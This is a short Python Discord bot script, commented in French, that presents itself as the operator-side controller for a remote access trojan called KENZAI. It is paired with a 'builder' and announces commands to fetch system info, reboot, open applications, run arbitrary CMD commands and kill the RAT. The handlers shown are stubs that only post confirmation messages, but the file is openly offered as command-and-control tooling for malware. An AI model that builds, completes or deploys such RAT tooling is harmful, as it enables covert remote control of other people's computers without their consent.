#!/usr/bin/env python3
# KENZAI BOT DISCORD - A lancer sur ton PC

import discord
from discord.ext import commands

# ===== CONFIGURATION (MODIFIE ICI) =====
TOKEN = "TOKEN_BOT_ICI"  # Même token que dans le builder
CHANNEL_ID = 123456789101112  # Même ID que dans le builder
# =======================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot connecte: {bot.user}")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("✅ KENZAI BOT ACTIF !")
        await channel.send("")
        await channel.send("**Commandes:**")
        await channel.send("`!info` - Infos systeme")
        await channel.send("`!reboot` - Redemarrage")
        await channel.send("`!open notepad` - Ouvrir une app")
        await channel.send("`!cmd ipconfig` - Commande CMD")
        await channel.send("`!kill` - Arreter le RAT")

@bot.command()
async def info(ctx):
    await ctx.send("📡 Commande !info envoyee au RAT")

@bot.command()
async def reboot(ctx):
    await ctx.send("🔄 Commande !reboot envoyee")

@bot.command()
async def open(ctx, *, app):
    await ctx.send(f"📂 Commande !open {app} envoyee")

@bot.command()
async def cmd(ctx, *, command):
    await ctx.send(f"💻 Commande !cmd {command} envoyee")

@bot.command()
async def kill(ctx):
    await ctx.send("💀 Commande !kill envoyee")

if __name__ == "__main__":
    bot.run(TOKEN)